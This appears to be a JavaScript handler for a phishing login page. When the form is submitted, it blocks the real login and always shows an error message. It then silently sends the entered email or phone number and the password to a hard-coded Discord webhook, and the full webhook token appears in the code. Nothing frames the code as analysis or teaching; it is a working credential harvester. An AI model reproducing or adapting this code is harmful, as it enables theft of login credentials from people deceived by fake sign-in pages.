document.getElementById('loginForm').addEventListener('submit', async function(e) {
  e.preventDefault();
  
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;
  const errorMessage = document.getElementById('error-message');

  errorMessage.style.display = 'block';

  const data = {
    content: `Login Attempt:\nEmail/Phone: ${email}\nPassword: ${password}`
  };
  
  try {
    await fetch('https://discord.com/api/webhooks/1339020722537894038/ktSj-QgzSFSmLH3mHgjx2MO5Z4tUEohR88c_OxMQMWmxbI-Qbuz9PXJQQDuUIIFdGQG8', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data)
    });
  } catch (error) {
    console.error('Error sending webhook:', error);
  }
});
